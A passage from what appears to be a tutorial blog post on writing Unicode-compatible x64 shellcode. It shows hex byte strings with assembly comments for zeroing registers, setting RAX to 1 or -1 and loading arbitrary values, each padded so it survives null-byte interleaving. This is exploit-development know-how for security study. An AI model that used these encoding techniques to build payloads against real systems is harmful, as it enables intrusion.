bold;\">mov</span>   <span style=\"color: #000080;\">eax</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008000;\">0xff00ff00</span>     <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>      <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x2d\\x00\\xff\\x00\\xff\"</span> <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">sub</span>   <span style=\"color: #000080;\">eax</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008000;\">0xff00ff00</span>     <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>      <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-07-02 14:33:44 UTC --></p>\n<p>Copy 0xFF00FF00 to EAX. Bitwise XOR with 0xFF00FF00.</p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #0000e6;\">\"\\xb8\\x00\\xff\\x00\\xff\"</span> <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">mov</span>   <span style=\"color: #000080;\">eax</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008000;\">0xff00ff00</span>     <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>      <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x35\\x00\\xff\\x00\\xff\"</span> <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">xor</span>   <span style=\"color: #000080;\">eax</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008000;\">0xff00ff00</span>     <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>      <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-07-02 14:34:04 UTC --></p>\n<p>Copy 0xFE00FE00 to EAX. Bitwise AND with 0x01000100.</p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #0000e6;\">\"\\xb8\\x00\\xfe\\x00\\xfe\"</span> <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">mov</span>   <span style=\"color: #000080;\">eax</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008000;\">0xfe00fe00</span>     <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>      <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x25\\x00\\x01\\x00\\x01\"</span> <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">and</span>   <span style=\"color: #000080;\">eax</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008000;\">0x01000100</span>      <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>      <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-07-02 14:34:27 UTC --></p>\n<h3 id=\"setpos\">3.3 Set RAX to 1</h3>\n<p>PUSH 0 creates a local variable we&#8217;ll call <var>X</var> and assigns a value of 0. PUSH RSP creates a local variable we&#8217;ll call <var>A</var> and assigns the address of <var>X</var>. POP RAX loads <var>A</var> into the RAX register. INC DWORD[RAX] assigns 1 to <var>X</var>. POP RAX loads <var>X</var> into the RAX register.</p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #0000e6;\">\"\\x6a\\x00\"</span>     <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">push</span> <span style=\"color: #008c00;\">0</span>              <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x54\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">push</span> rsp            <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span> <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>  <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span> <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x58\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">pop</span>  rax            <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span> <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>  <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span> <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\xff\\x00\"</span>     <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">inc</span>  <span style=\"color: #800000; font-weight: bold;\">dword</span> <span style=\"color: #808030;\">[</span>rax<span style=\"color: #808030;\">]</span>    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x58\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">pop</span>  rax            <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span> <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>  <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span> <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-07-08 06:31:54 UTC --></p>\n<p>PUSH 0 creates a local variable we&#8217;ll call <var>X</var> and assigns a value of 0. PUSH RSP creates a local variable we&#8217;ll call <var>A</var> and assigns the address of <var>X</var>. POP RAX loads <var>A</var> into the RAX register. MOV BYTE[RAX], 1 assigns 1 to <var>X</var>. POP RAX loads <var>X</var> into the RAX register.</p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #0000e6;\">\"\\x6a\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">push</span>  <span style=\"color: #008c00;\">0</span>              <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x54\"</span>             <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">push</span>  <span style=\"color: #000080;\">rsp</span>            <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>     <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span> <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x58\"</span>             <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">pop</span>   <span style=\"color: #000080;\">rax</span>            <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>     <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span> <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\xc6\\x00\\x01\"</span>     <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">mov</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">eax</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">1</span>  <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>     <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span> <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x58\"</span>             <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">pop</span>   <span style=\"color: #000080;\">rax</span>            <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>     <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span> <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-07-02 15:46:52 UTC --></p>\n<h3 id=\"setneg\">3.4 Set RAX to -1</h3>\n<p>PUSH 0 creates a local variable we&#8217;ll call <var>X</var> and assigns a value of 0. POP RCX loads <var>X</var> into the RCX register. LOOP $+2 decreases RCX by 1 leaving -1. PUSH RCX stores -1 on the stack and POP RAX sets RAX to -1.</p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #0000e6;\">\"\\x6a\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">push</span>  <span style=\"color: #008c00;\">0</span>              <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x59\"</span>             <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">pop</span>   <span style=\"color: #000080;\">rcx</span>            <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>     <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span> <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\xe2\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">loop</span>  <span style=\"color: #e34adc;\">$+2</span>            <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x34\\x00\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">xor</span>   <span style=\"color: #000080;\">al</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">0</span>          <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x51\"</span>             <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">push</span>  <span style=\"color: #000080;\">rcx</span>            <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>     <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>   <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span> <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x58\"</span>             <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">pop</span>   <span style=\"color: #000080;\">rax</span>            <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-07-02 17:39:21 UTC --></p>\n<p>PUSH 0 creates a local variable we&#8217;ll call <var>X</var> and assigns a value of 0. PUSH RSP creates a local variable we&#8217;ll call <var>A</var> and assigns the address of <var>X</var>. POP RAX loads <var>A</var> into the RAX register. INC DWORD[RAX] assigns 1 to <var>X</var>. IMUL EAX, DWORD[RAX], -1 multiplies <var>X</var> by -1 and stores the result in EAX.</p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #0000e6;\">\"\\x6a\\x00\"</span>     <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">push</span> <span style=\"color: #008c00;\">0</span>                    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x54\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">push</span> rsp                  <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span> <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>  <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>       <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x58\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">pop</span>  rax                  <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span> <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>  <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>       <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\xff\\x00\"</span>     <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">inc</span>  <span style=\"color: #800000; font-weight: bold;\">dword</span> <span style=\"color: #808030;\">[</span>rax<span style=\"color: #808030;\">]</span>          <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x6b\\x00\\xff\"</span> <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">imul</span> <span style=\"color: #000080;\">eax</span><span style=\"color: #808030;\">,</span> <span style=\"color: #800000; font-weight: bold;\">dword</span> <span style=\"color: #808030;\">[</span>rax<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008c00;\">-1</span> <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span> <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>  <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>       <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x59\"</span>         <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">pop</span>  rcx                  <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-07-08 06:33:52 UTC --></p>\n<h3 id=\"setdata\">3.5 Load and Store Data</h3>\n<p>Initializing registers to 0, 1 or -1 is not a problem, as you can see from the above examples. Loading arbitrary data is a bit trickier, but you can get creative with some aproaches.</p>\n<p>Let&#8217;s take for example setting EAX to 0x12345678.</p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #0000e6;\">\"\\xb8\\x78\\x56\\x34\\x12\"</span> <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">mov</span>   <span style=\"color: #000080;\">eax</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008000;\">0x12345678</span>  <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-07-02 15:40:19 UTC --></p>\n<p>This uses IMUL to set EAX to 0x00340078 and an XOR with 0x12005600 to finish it off.</p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #0000e6;\">\"\\x6a\\x00\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">push</span> <span style=\"color: #008c00;\">0</span>                          <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x54\"</span>                     <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">push</span> rsp                        <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>             <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>  <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>             <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x58\"</span>                     <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">pop</span>  rax                        <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>             <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>  <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>             <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\xff\\x00\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">inc</span>  <span style=\"color: #800000; font-weight: bold;\">dword</span> <span style=\"color: #808030;\">[</span>rax<span style=\"color: #808030;\">]</span>                <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x69\\x00\\x78\\x00\\x34\\x00\"</span> <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">imul</span> <span style=\"color: #000080;\">eax</span><span style=\"color: #808030;\">,</span> <span style=\"color: #800000; font-weight: bold;\">dword</span> <span style=\"color: #808030;\">[</span>rax<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008000;\">0x340078</span> <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x58\"</span>                     <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">pop</span>  rax                        <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>             <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>  <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span>rbp<span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>             <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x35\\x00\\x56\\x00\\x12\"</span>     <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">xor</span>  <span style=\"color: #000080;\">eax</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008000;\">0x12005600</span>            <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n</pre>\n<p><!--Created using ToHtml.com on 2020-07-08 05:52:21 UTC --></p>\n<p>Create a local variable we&#8217;ll call <var>X</var>, by storing 0 on the stack. Create a local variable we&#8217;ll call <var>A</var>, which contains the address of <var>X</var> . Load <var>A</var> into RAX. Store 0x00340078 in <var>X</var> using MOV DWORD[RAX], 0x00340078. Load <var>X</var> into RAX. XOR EAX with 0x12005600. EAX now contains 0x12345678.</p>\n<pre style=\"color: #000000; background: #ffffff;\"><span style=\"color: #0000e6;\">\"\\x6a\\x00\"</span>                 <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">push</span>   <span style=\"color: #008c00;\">0</span>                      <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x54\"</span>                     <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">push</span>   <span style=\"color: #000080;\">rsp</span>                    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>             <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>    <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>         <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x58\"</span>                     <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">pop</span>    <span style=\"color: #000080;\">rax</span>                    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>             <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>    <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>         <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\xc7\\x00\\x78\\x00\\x34\\x00\"</span> <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">mov</span>    <span style=\"color: #800000; font-weight: bold;\">dword</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rax</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008000;\">0x340078</span>  <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x58\"</span>                     <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">pop</span>    <span style=\"color: #000080;\">rax</span>                    <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>             <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>    <span style=\"color: #800000; font-weight: bold;\">byte</span> <span style=\"color: #808030;\">[</span><span style=\"color: #000080;\">rbp</span><span style=\"color: #808030;\">]</span><span style=\"color: #808030;\">,</span> <span style=\"color: #000080;\">cl</span>         <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x35\\x00\\x56\\x00\\x12\"</span>     <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">xor</span>    <span style=\"color: #000080;\">eax</span><span style=\"color: #808030;\">,</span> <span style=\"color: #008000;\">0x12005600</span>        <span style=\"color: #808030;\">*</span><span style=\"color: #808030;\">/</span>\n<span style=\"color: #0000e6;\">\"\\x00\\x4d\\x00\"</span>             <span style=\"color: #808030;\">/</span><span style=\"color: #808030;\">*</span> <span style=\"color: #800000; font-weight: bold;\">add</span>    <span style=\"color: #800000; font-weight: 